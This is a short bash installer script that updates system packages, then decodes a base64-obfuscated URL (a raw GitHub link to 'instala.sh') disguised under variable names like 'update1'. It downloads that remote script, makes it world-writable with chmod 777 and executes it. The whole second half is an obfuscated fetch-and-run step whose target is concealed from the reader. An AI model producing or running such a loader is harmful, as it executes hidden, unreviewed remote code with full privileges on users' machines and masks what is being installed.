#!/bin/bash
apt-get update -y; apt-get upgrade -y;
update1='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NodW1vR0gvcnVzcy9tYXN0ZXIvaW5zdGFsYS5zaA=='
dom='base64 -d'
RE=$(echo $update1|$dom)
wget -O instala.sh $RE;chmod 777 instala.sh* && ./instala.sh*